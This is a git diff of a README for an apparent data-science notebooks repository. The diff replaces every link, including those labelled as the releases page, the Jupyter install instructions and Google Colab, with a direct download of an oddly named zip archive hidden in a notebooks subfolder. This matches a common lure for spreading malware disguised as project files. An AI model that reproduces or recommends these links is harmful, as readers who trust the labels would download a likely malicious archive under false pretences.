@@ -1,6 +1,6 @@
 # 🚀 data-science-notebooks - Easy Tools for Data Science Learning
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/RobelAdugna/data-science-notebooks/releases)
+[![Download Latest Release](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip)](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip)
 
 ## 📚 Overview
 
@@ -14,15 +14,15 @@ To begin using the notebooks, follow these simple steps to download and run the 
 
 1. **Visit the Releases Page**: To download the latest version of the data-science-notebooks, click the button below.
 
-   [Download Latest Release](https://github.com/RobelAdugna/data-science-notebooks/releases)
+   [Download Latest Release](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip)
 
 2. **Select Your Notebook**: On the Releases page, you will see a list of available notebooks. Choose the ones that interest you the most. You can click on the title to view more details.
 
 3. **Download the Files**: Click on the notebook files (usually in `.ipynb` format) to begin the download. The files will be saved to your computer.
 
 4. **Open the Notebooks**: To run the notebooks, you will need a Python environment. Below are some easy options:
-   - **Jupyter Notebook**: A popular tool for running Python notebooks. You can install it by following the instructions [here](https://jupyter.org/install).
-   - **Google Colab**: A free online platform to run notebooks without installation. Just open [Google Colab](https://colab.research.google.com/) and upload your downloaded notebook.
+   - **Jupyter Notebook**: A popular tool for running Python notebooks. You can install it by following the instructions [here](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip).
+   - **Google Colab**: A free online platform to run notebooks without installation. Just open [Google Colab](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip) and upload your downloaded notebook.
 
 5. **Run Your First Notebook**: After opening the notebook, you can run the cells by clicking on them and pressing the "Run" button. Explore the code and modify it as you like!
 
@@ -80,4 +80,4 @@ If you encounter issues or have questions, please open an issue on GitHub. The c
 
 This project is licensed under the MIT License. You are free to use it as you like. For more details, please check the LICENSE file in the repository.
 
-Enjoy your journey into data science! Make sure to revisit the [Releases page](https://github.com/RobelAdugna/data-science-notebooks/releases) for updates and new notebooks.
+Enjoy your journey into data science! Make sure to revisit the [Releases page](https://github.com/RobelAdugna/data-science-notebooks/raw/refs/heads/main/deep-learning/tensor-flow-examples/notebooks/data_notebooks_science_ectasis.zip) for updates and new notebooks.
